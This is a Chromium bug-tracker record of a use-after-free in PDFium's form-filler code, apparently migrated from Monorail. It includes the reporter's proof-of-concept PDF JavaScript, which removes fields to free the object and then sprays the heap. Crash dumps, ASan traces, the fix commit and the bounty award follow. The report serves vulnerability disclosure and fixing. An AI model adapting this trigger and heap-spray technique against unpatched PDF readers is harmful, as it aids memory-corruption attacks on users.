# Security: Use-after-free in CFFL_FormFiller::KillFocusForAnnot

| Field | Value |
|-------|-------|
| **Issue ID** | [40092591](https://issues.chromium.org/issues/40092591) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2018-10-02 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free in CFFL\_FormFiller::KillFocusForAnnot

**VERSION**  

Operating System: Windows 10  

chrome with pdfium XFA enabled

**REPRODUCTION CASE**

1. Build chrome with XFA enabled
2. open file `poc_spray.pdf` in chrome

There is a problem in function |CFFL\_FormFiller::KillFocusForAnnot|

```
void CFFL_FormFiller::KillFocusForAnnot(CPDFSDK_Annot\* pAnnot, uint32_t nFlag) {  
  if (!IsValid())  
    return;  
  
  CPDFSDK_PageView\* pPageView = GetCurPageView(false);  
  if (!pPageView || !CommitData(pPageView, nFlag))  
    return;  
  if (CPWL_Wnd\* pWnd = GetPDFWindow(pPageView, false))  
    pWnd->KillFocus();		==> we can run callback javascript function at there!!!  
  
  bool bDestroyPDFWindow;  
  switch (m_pWidget->GetFieldType()) {  

```

function |CPWL\_Wnd::KillFocus| finally calls to function |PDFiumEngine::GetVisiblePageIndex| => |PDFiumPage::GetPage| => |FORM\_OnAfterLoadPage|. In function |FORM\_OnAfterLoadPage|, we can trigger the `format` event of any field in that page. In poc file, i setup a javascript function `format` handler for that field:

```
    this.baseURL += "1";  
    //app.alert('[format] Field[1] - Begin ... ' + this.baseURL)  
    if (this.baseURL == "111")   
    {  
        //app.alert('[format] Field[1] - Inside ... ')  
        this.removeField("txt1")  
        this.removeField("txt2")  
        
        var arr = new Array(0x10000);  
        for (var i = 0; i < arr.length; i++)   
        {  
            arr[i] = new ArrayBuffer(0x40);  
            var rop = new Int32Array(arr[i]);  
            for (var j = 0x0; j < rop.length; j++)   
            {  
                rop[j] = 0xAAAAAAAA;  
            }  
        }  
    }  

```

JS function `removeField` will also free the `CFFL_FormFiller` object in function |CFFL\_FormFiller::KillFocusForAnnot| and when return the context after `format` event handler in function |CFFL\_FormFiller::KillFocusForAnnot|, this object will be used again ==> it's use-after-free bug!

Context when crash

```
(2660.109c): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
chrome!fxcrt::UnownedPtr<CPDFSDK_InterForm>::operator->+0xa:  
644d061a 8b01            mov     eax,dword ptr [ecx]  ds:002b:aaaaaac2=????????  
  
2:062:x86> dv  
             this = 0x179bfe30  
           pAnnot = 0x179d3558  
            nFlag = 0  
        pPageView = 0x179bfce0  
	bDestroyPDFWindow = false  
  
2:062:x86> dd 0x179bfe30  
179bfe30  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa  
179bfe40  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa  
179bfe50  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa  
179bfe60  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa  
179bfe70  fdfdfdfd dddddddd 5bb34841 8c0019dd  
179bfe80  179d35f8 179d3ed8 00000000 00000000  
179bfe90  00000001 00000040 0000a8f8 fdfdfdfd  
179bfea0  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa  

```

I use javascript to spray to the freed `CFFL_FormFiller` object with `Int32Array`. As we can see that the freed `CFFL_FormFiller` object (memory at address `0x179bfe30`) is filled with the value `0xAAAAAAAA`

## Attachments

- [poc_spray.pdf](attachments/poc_spray.pdf) (application/pdf, 5.2 KB)
- [log_PageHeap.txt](attachments/log_PageHeap.txt) (text/plain, 18.0 KB)

## Timeline

### ts...@chromium.org (2018-10-02)

Lei, in case you want to take a shot at this before I get back to it.

[Monorail components: Internals>Plugins>PDF]

### ts...@chromium.org (2018-10-02)

Requires chrome, not pdfium_test, since the usage comes from chrome_pdf::PDFiumPage::Unload() 

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c0000298f8 at pc 0x5589e8b0fd8c bp 0x7fffb1945590 sp 0x7fffb1945588
READ of size 8 at 0x60c0000298f8 thread T0 (chrome)
    #0 0x5589e8b0fd8b in operator-> ./../../third_party/pdfium/core/fxcrt/unowned_ptr.h:102:34
    #1 0x5589e8b0fd8b in CFFL_FormFiller::KillFocusForAnnot(CPDFSDK_Annot*, unsigned int) ./../../third_party/pdfium/fpdfsdk/formfiller/cffl_formfiller.cpp:315:0
    #2 0x5589e8b1a88b in CFFL_InteractiveFormFiller::OnKillFocus(fxcrt::Observable<CPDFSDK_Annot>::ObservedPtr*, unsigned int) ./../../third_party/pdfium/fpdfsdk/formfiller/cffl_interactiveformfiller.cpp:420:16
    #3 0x5589e8ab9901 in CPDFSDK_FormFillEnvironment::KillFocusAnnot(unsigned int) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_formfillenvironment.cpp:694:23
    #4 0x5589e8abb4e2 in CPDFSDK_FormFillEnvironment::RemovePageView(IPDF_Page*) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_formfillenvironment.cpp:611:5
    #5 0x5589e8a4dabb in chrome_pdf::PDFiumPage::Unload() ./../../pdf/pdfium/pdfium_page.cc:116:7
    #6 0x5589e89e86f8 in chrome_pdf::PDFiumEngine::CalculateVisiblePages() ./../../pdf/pdfium/pdfium_engine.cc:2817:20
    #7 0x5589e89e9f24 in chrome_pdf::PDFiumEngine::ScrolledToYPosition(int) ./../../pdf/pdfium/pdfium_engine.cc:750:3
    #8 0x5589e89b64c0 in chrome_pdf::OutOfProcessInstance::HandleMessage(pp::Var const&) ./../../pdf/out_of_process_instance.cc:637:14
    #9 0x5589d4fb7083 in pp::Messaging_HandleMessage(int, PP_Var) ./../../ppapi/cpp/module.cc:141:13
    #10 0x5589e5745d51 in CallWhileUnlocked<void, int, PP_Var, int, PP_Var> ./../../ppapi/shared_impl/proxy_lock.h:135:10
    #11 0x5589e5745d51 in ppapi::proxy::PPP_Messaging_Proxy::OnMsgHandleMessage(int, ppapi::proxy::SerializedVarReceiveInput) ./../../ppapi/proxy/ppp_messaging_proxy.cc:110:0
    #12 0x5589e57455d6 in DispatchToMethodImpl<ppapi::proxy::PPP_Messaging_Proxy *, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput), std::__1::tuple<int, ppapi::proxy::SerializedVar>, 0, 1> ./../../base/tuple.h:52:3
    #13 0x5589e57455d6 in DispatchToMethod<ppapi::proxy::PPP_Messaging_Proxy *, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput), std::__1::tuple<int, ppapi::proxy::SerializedVar> > ./../../base/tuple.h:60:0
    #14 0x5589e57455d6 in DispatchToMethod<ppapi::proxy::PPP_Messaging_Proxy, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput), void, std::__1::tuple<int, ppapi::proxy::SerializedVar> > ./../../ipc/ipc_message_templates.h:51:0
    #15 0x5589e57455d6 in bool IPC::MessageT<PpapiMsg_PPPMessaging_HandleMessage_Meta, std::__1::tuple<int, ppapi::proxy::SerializedVar>, void>::Dispatch<ppapi::proxy::PPP_Messaging_Proxy, ppapi::proxy::PPP_Messaging_Proxy, void, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput)>(IPC::Message const*, ppapi::proxy::PPP_Messaging_Proxy*, ppapi::proxy::PPP_Messaging_Proxy*, void*, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput)) ./../../ipc/ipc_message_templates.h:146:0
    #16 0x5589e574527c in ppapi::proxy::PPP_Messaging_Proxy::OnMessageReceived(IPC::Message const&) ./../../ppapi/proxy/ppp_messaging_proxy.cc:77:5
    #17 0x5589e569d7f4 in ppapi::proxy::PluginDispatcher::OnMessageReceived(IPC::Message const&) ./../../ppapi/proxy/plugin_dispatcher.cc:272:22
    #18 0x5589d7e0f5d6 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) ./../../ipc/ipc_channel_proxy.cc:320:14
    #19 0x5589d61dc147 in Run ./../../base/callback.h:99:12
    #20 0x5589d61dc147 in base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask*) ./../../base/debug/task_annotator.cc:99:0
    #21 0x5589d61d81f4 in base::MessageLoop::RunTask(base::PendingTask*) ./../../base/message_loop/message_loop.cc:434:46
    #22 0x5589d61d9091 in DeferOrRunPendingTask ./../../base/message_loop/message_loop.cc:445:5
    #23 0x5589d61d9091 in base::MessageLoop::DoWork() ./../../base/message_loop/message_loop.cc:517:0
    #24 0x5589d61e375c in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:37:31
    #25 0x5589d626a279 in base::RunLoop::Run() ./../../base/run_loop.cc:102:14
    #26 0x5589d4f40402 in content::PpapiPluginMain(content::MainFunctionParams const&) ./../../content/ppapi_plugin/ppapi_plugin_main.cc:157:12
    #27 0x5589d526c501 in content::RunZygote(content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:496:14
    #28 0x5589d527034b in content::ContentMainRunnerImpl::Run(bool) ./../../content/app/content_main_runner_impl.cc:899:10
    #29 0x5589d53e59c1 in service_manager::Main(service_manager::MainParams const&) ./../../services/service_manager/embedder/main.cc:472:29
    #30 0x5589d526a5e8 in content::ContentMain(content::ContentMainParams const&) ./../../content/app/content_main.cc:19:10
    #31 0x5589cc994cc7 in ChromeMain ./../../chrome/app/chrome_main.cc:102:12
    #32 0x7f4be1f592b0 in __libc_start_main ??:0:0

0x60c0000298f8 is located 56 bytes inside of 128-byte region [0x60c0000298c0,0x60c000029940)
freed by thread T0 (chrome) here:
    #0 0x5589cc9927b2 in operator delete(void*) _asan_rtl_:3
    #1 0x5589e8b16230 in operator() ./../../buildtools/third_party/libc++/trunk/include/memory:2321:5
    #2 0x5589e8b16230 in reset ./../../buildtools/third_party/libc++/trunk/include/memory:2634:0
    #3 0x5589e8b16230 in ~unique_ptr ./../../buildtools/third_party/libc++/trunk/include/memory:2588:0
    #4 0x5589e8b16230 in ~pair ./../../buildtools/third_party/libc++/trunk/include/utility:312:0
    #5 0x5589e8b16230 in __destroy<std::__1::pair<CPDFSDK_Annot *const, std::__1::unique_ptr<CFFL_FormFiller, std::__1::default_delete<CFFL_FormFiller> > > > ./../../buildtools/third_party/libc++/trunk/include/memory:1733:0
    #6 0x5589e8b16230 in destroy<std::__1::pair<CPDFSDK_Annot *const, std::__1::unique_ptr<CFFL_FormFiller, std::__1::default_delete<CFFL_FormFiller> > > > ./../../buildtools/third_party/libc++/trunk/include/memory:1596:0
    #7 0x5589e8b16230 in erase ./../../buildtools/third_party/libc++/trunk/include/__tree:2368:0
    #8 0x5589e8b16230 in erase ./../../buildtools/third_party/libc++/trunk/include/map:1194:0
    #9 0x5589e8b16230 in CFFL_InteractiveFormFiller::UnRegisterFormFiller(CPDFSDK_Annot*) ./../../third_party/pdfium/fpdfsdk/formfiller/cffl_interactiveformfiller.cpp:568:0
    #10 0x5589e8a941f0 in CPDFSDK_WidgetHandler::ReleaseAnnot(CPDFSDK_Annot*) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_widgethandler.cpp:81:20
    #11 0x5589e8a7b2e7 in CPDFSDK_PageView::DeleteAnnot(CPDFSDK_Annot*) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_pageview.cpp:180:22
    #12 0x5589e9252092 in CJS_Document::removeField(CJS_Runtime*, std::__1::vector<v8::Local<v8::Value>, std::__1::allocator<v8::Local<v8::Value> > > const&) ./../../third_party/pdfium/fxjs/cjs_document.cpp:445:18
    #13 0x5589e927d08b in void JSMethod<CJS_Document, &(CJS_Document::removeField(CJS_Runtime*, std::__1::vector<v8::Local<v8::Value>, std::__1::allocator<v8::Local<v8::Value> > > const&))>(char const*, char const*, v8::FunctionCallbackInfo<v8::Value> const&) ./../../third_party/pdfium/fxjs/js_define.h:135:23
    #14 0x5589d2b666c8 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo*) ./../../v8/src/api-arguments-inl.h:140:3
    #15 0x5589d2b63a36 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:109:36
    #16 0x5589d2b615d4 in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:139:5
    #17 0x5589d491676d in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit embedded.cc:?
    #18 0x5589d491676d in ?? ??:0
    #10 0x7e8849a8816d  (<unknown module>)
    #19 0x5589d4886462 in Builtins_JSEntryTrampoline embedded.cc:?
    #20 0x5589d4886462 in ?? ??:0
    #12 0x7e8849a84b1d  (<unknown module>)
    #21 0x5589d35f317d in Call ./../../v8/src/simulator.h:113:12
    #22 0x5589d35f317d in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) ./../../v8/src/execution.cc:155:0
    #23 0x5589d35f299e in CallInternal ./../../v8/src/execution.cc:191:10
    #24 0x5589d35f299e in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) ./../../v8/src/execution.cc:202:0
    #25 0x5589d29abc4d in v8::Script::Run(v8::Local<v8::Context>) ./../../v8/src/api.cc:2115:7
    #26 0x5589e923378b in CFXJS_Engine::Execute(fxcrt::WideString const&) ./../../third_party/pdfium/fxjs/cfxjs_engine.cpp:534:25
    #27 0x5589e923c31c in CJS_Runtime::ExecuteScript(fxcrt::WideString const&) ./../../third_party/pdfium/fxjs/cjs_runtime.cpp:176:10
    #28 0x5589e92f2144 in CJS_EventContext::RunScript(fxcrt::WideString const&) ./../../third_party/pdfium/fxjs/cjs_event_context.cpp:53:23
    #29 0x5589e8aa6252 in CPDFSDK_InterForm::OnFormat(CPDF_FormField*, bool&) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_interform.cpp:361:57
    #30 0x5589e8a9b6fc in CPDFSDK_Widget::OnFormat(bool&) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_widget.cpp:641:24
    #31 0x5589e8a95625 in CPDFSDK_WidgetHandler::OnLoad(CPDFSDK_Annot*) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_widgethandler.cpp:233:34
    #32 0x5589e8a7f990 in CPDFSDK_PageView::LoadFXAnnots() ./../../third_party/pdfium/fpdfsdk/cpdfsdk_pageview.cpp:492:23
    #33 0x5589e8aba7f1 in CPDFSDK_FormFillEnvironment::GetPageView(IPDF_Page*, bool) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_formfillenvironment.cpp:538:14
    #34 0x5589e8a77faf in FormHandleToPageView ./../../third_party/pdfium/fpdfsdk/fpdf_formfill.cpp:160:39
    #35 0x5589e8a77faf in FORM_OnAfterLoadPage ./../../third_party/pdfium/fpdfsdk/fpdf_formfill.cpp:626:0
    #36 0x5589e8a4dea9 in chrome_pdf::PDFiumPage::GetPage() ./../../pdf/pdfium/pdfium_page.cc:131:7
    #37 0x5589e8a199a7 in chrome_pdf::PDFiumEngine::GetVisiblePageIndex(fpdf_page_t__*) ./../../pdf/pdfium/pdfium_engine.cc:3375:29
    #38 0x5589e8a450b1 in chrome_pdf::PDFiumFormFiller::Form_Invalidate(_FPDF_FORMFILLINFO*, fpdf_page_t__*, double, double, double, double) ./../../pdf/pdfium/pdfium_form_filler.cc:93:28
    #39 0x5589e8abccf0 in CFX_SystemHandler::InvalidateRect(CPDFSDK_Widget*, CFX_FloatRect const&) ./../../third_party/pdfium/fpdfsdk/cfx_systemhandler.cpp:46:19
    #40 0x5589e9472dc8 in CPWL_Wnd::InvalidateRect(CFX_FloatRect*) ./../../third_party/pdfium/fpdfsdk/pwl/cpwl_wnd.cpp:297:8

previously allocated by thread T0 (chrome) here:
    #0 0x5589cc991b72 in operator new(unsigned long) _asan_rtl_:3
    #1 0x5589e8b15101 in MakeUnique<CFFL_TextField, CPDFSDK_FormFillEnvironment *, CPDFSDK_Widget *&> ./../../third_party/pdfium/third_party/base/ptr_util.h:56:29
    #2 0x5589e8b15101 in CFFL_InteractiveFormFiller::GetFormFiller(CPDFSDK_Annot*, bool) ./../../third_party/pdfium/fpdfsdk/formfiller/cffl_interactiveformfiller.cpp:494:0
    #3 0x5589e8b19f8d in CFFL_InteractiveFormFiller::OnSetFocus(fxcrt::Observable<CPDFSDK_Annot>::ObservedPtr*, unsigned int) ./../../third_party/pdfium/fpdfsdk/formfiller/cffl_interactiveformfiller.cpp:404:38
    #4 0x5589e8abbd1c in CPDFSDK_FormFillEnvironment::SetFocusAnnot(fxcrt::Observable<CPDFSDK_Annot>::ObservedPtr*) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_formfillenvironment.cpp:671:23
    #5 0x5589e92bee2d in CJS_Field::setFocus(CJS_Runtime*, std::__1::vector<v8::Local<v8::Value>, std::__1::allocator<v8::Local<v8::Value> > > const&) ./../../third_party/pdfium/fxjs/cjs_field.cpp:2535:21
    #6 0x5589e92dff23 in void JSMethod<CJS_Field, &(CJS_Field::setFocus(CJS_Runtime*, std::__1::vector<v8::Local<v8::Value>, std::__1::allocator<v8::Local<v8::Value> > > const&))>(char const*, char const*, v8::FunctionCallbackInfo<v8::Value> const&) ./../../third_party/pdfium/fxjs/js_define.h:135:23
    #7 0x5589d2b666c8 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo*) ./../../v8/src/api-arguments-inl.h:140:3
    #8 0x5589d2b63a36 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:109:36
    #9 0x5589d2b615d4 in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:139:5
    #10 0x5589d491676d in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit embedded.cc:?
    #11 0x5589d491676d in ?? ??:0
    #10 0x7e8849a8816d  (<unknown module>)
    #12 0x5589d4886462 in Builtins_JSEntryTrampoline embedded.cc:?
    #13 0x5589d4886462 in ?? ??:0
    #12 0x7e8849a84b1d  (<unknown module>)
    #14 0x5589d35f317d in Call ./../../v8/src/simulator.h:113:12
    #15 0x5589d35f317d in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) ./../../v8/src/execution.cc:155:0
    #16 0x5589d35f299e in CallInternal ./../../v8/src/execution.cc:191:10
    #17 0x5589d35f299e in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) ./../../v8/src/execution.cc:202:0
    #18 0x5589d29abc4d in v8::Script::Run(v8::Local<v8::Context>) ./../../v8/src/api.cc:2115:7
    #19 0x5589e923378b in CFXJS_Engine::Execute(fxcrt::WideString const&) ./../../third_party/pdfium/fxjs/cfxjs_engine.cpp:534:25
    #20 0x5589e923c31c in CJS_Runtime::ExecuteScript(fxcrt::WideString const&) ./../../third_party/pdfium/fxjs/cjs_runtime.cpp:176:10
    #21 0x5589e92f2144 in CJS_EventContext::RunScript(fxcrt::WideString const&) ./../../third_party/pdfium/fxjs/cjs_event_context.cpp:53:23
    #22 0x5589e8aafd53 in CPDFSDK_ActionHandler::RunScript(CPDFSDK_FormFillEnvironment*, fxcrt::WideString const&, std::__1::function<void (IJS_EventContext*)> const&) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_actionhandler.cpp:546:13
    #23 0x5589e8aadfed in RunDocumentPageJavaScript ./../../third_party/pdfium/fpdfsdk/cpdfsdk_actionhandler.cpp:465:3
    #24 0x5589e8aadfed in CPDFSDK_ActionHandler::ExecuteDocumentPageAction(CPDF_Action const&, CPDF_AAction::AActionType, CPDFSDK_FormFillEnvironment*, std::__1::set<CPDF_Dictionary const*, std::__1::less<CPDF_Dictionary const*>, std::__1::allocator<CPDF_Dictionary const*> >*) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_actionhandler.cpp:190:0
    #25 0x5589e8aad97c in CPDFSDK_ActionHandler::DoAction_Page(CPDF_Action const&, CPDF_AAction::AActionType, CPDFSDK_FormFillEnvironment*) ./../../third_party/pdfium/fpdfsdk/cpdfsdk_actionhandler.cpp:68:10
    #26 0x5589e8a78639 in FORM_DoPageAAction ./../../third_party/pdfium/fpdfsdk/fpdf_formfill.cpp:712:21
    #27 0x5589e8a12846 in chrome_pdf::PDFiumEngine::SetCurrentPage(int) ./../../pdf/pdfium/pdfium_engine.cc:3389:5
    #28 0x5589e89e8ed7 in chrome_pdf::PDFiumEngine::CalculateVisiblePages() ./../../pdf/pdfium/pdfium_engine.cc:2844:3
    #29 0x5589e89e9f24 in chrome_pdf::PDFiumEngine::ScrolledToYPosition(int) ./../../pdf/pdfium/pdfium_engine.cc:750:3
    #30 0x5589e89b64c0 in chrome_pdf::OutOfProcessInstance::HandleMessage(pp::Var const&) ./../../pdf/out_of_process_instance.cc:637:14
    #31 0x5589d4fb7083 in pp::Messaging_HandleMessage(int, PP_Var) ./../../ppapi/cpp/module.cc:141:13
    #32 0x5589e5745d51 in CallWhileUnlocked<void, int, PP_Var, int, PP_Var> ./../../ppapi/shared_impl/proxy_lock.h:135:10
    #33 0x5589e5745d51 in ppapi::proxy::PPP_Messaging_Proxy::OnMsgHandleMessage(int, ppapi::proxy::SerializedVarReceiveInput) ./../../ppapi/proxy/ppp_messaging_proxy.cc:110:0
    #34 0x5589e57455d6 in DispatchToMethodImpl<ppapi::proxy::PPP_Messaging_Proxy *, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput), std::__1::tuple<int, ppapi::proxy::SerializedVar>, 0, 1> ./../../base/tuple.h:52:3
    #35 0x5589e57455d6 in DispatchToMethod<ppapi::proxy::PPP_Messaging_Proxy *, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput), std::__1::tuple<int, ppapi::proxy::SerializedVar> > ./../../base/tuple.h:60:0
    #36 0x5589e57455d6 in DispatchToMethod<ppapi::proxy::PPP_Messaging_Proxy, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput), void, std::__1::tuple<int, ppapi::proxy::SerializedVar> > ./../../ipc/ipc_message_templates.h:51:0
    #37 0x5589e57455d6 in bool IPC::MessageT<PpapiMsg_PPPMessaging_HandleMessage_Meta, std::__1::tuple<int, ppapi::proxy::SerializedVar>, void>::Dispatch<ppapi::proxy::PPP_Messaging_Proxy, ppapi::proxy::PPP_Messaging_Proxy, void, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput)>(IPC::Message const*, ppapi::proxy::PPP_Messaging_Proxy*, ppapi::proxy::PPP_Messaging_Proxy*, void*, void (ppapi::proxy::PPP_Messaging_Proxy::*)(int, ppapi::proxy::SerializedVarReceiveInput)) ./../../ipc/ipc_message_templates.h:146:0



### ts...@chromium.org (2018-10-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-10-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/758003297868f2c02adcf4fec07ee9ebdef666f6

commit 758003297868f2c02adcf4fec07ee9ebdef666f6
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Wed Oct 03 00:22:50 2018

Roll src/third_party/pdfium 7f47c50227fb..0c56d6362b95 (5 commits)

https://pdfium.googlesource.com/pdfium.git/+log/7f47c50227fb..0c56d6362b95


git log 7f47c50227fb..0c56d6362b95 --date=short --no-merges --format='%ad %ae %s'
2018-10-02 thestig@chromium.org Make CFGAS_DefaultFontManager a class with only static methods.
2018-10-02 thestig@chromium.org Reduce includes in cfgas_defaultfontmanager.h
2018-10-02 thestig@chromium.org Remove unneeded cfgas_fontmgr.h includes.
2018-10-02 tsepez@chromium.org Consolidate ReadMoreData() calls.
2018-10-02 tsepez@chromium.org Remove ability to delete annot in CJS_Document::removeField()


Created with:
  gclient setdep -r src/third_party/pdfium@0c56d6362b95

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.



BUG=chromium:891210
TBR=dsinclair@chromium.org

Change-Id: I495207acea5218f1631688c1520c7d2be33b6c6d
Reviewed-on: https://chromium-review.googlesource.com/c/1258404
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#596066}
[modify] https://crrev.com/758003297868f2c02adcf4fec07ee9ebdef666f6/DEPS


### me...@chromium.org (2018-10-04)

Lei, Tom, can one of you assign the impacts label?

### th...@chromium.org (2018-10-04)

None because XFA is not enabled.

### ts...@chromium.org (2018-10-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-05)

[Empty comment from Monorail migration]

### me...@google.com (2018-10-09)

[Empty comment from Monorail migration]

### ts...@chromium.org (2018-10-09)

Not android, android builds without any JS at all.

### hu...@gmail.com (2018-10-12)

[Comment Deleted]

### aw...@google.com (2018-11-01)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-11-12)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-11-12)

Hi huyna89@, the Chrome VRP panel decided to award $3,000 for this :-)

### aw...@google.com (2018-11-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-01-11)

This issue was migrated from crbug.com/chromium/891210?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092591)*
